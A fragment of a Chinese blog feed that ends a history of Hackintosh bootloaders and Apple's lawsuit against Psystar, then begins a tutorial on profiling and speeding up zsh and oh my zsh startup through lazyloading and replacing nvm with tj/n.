href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span 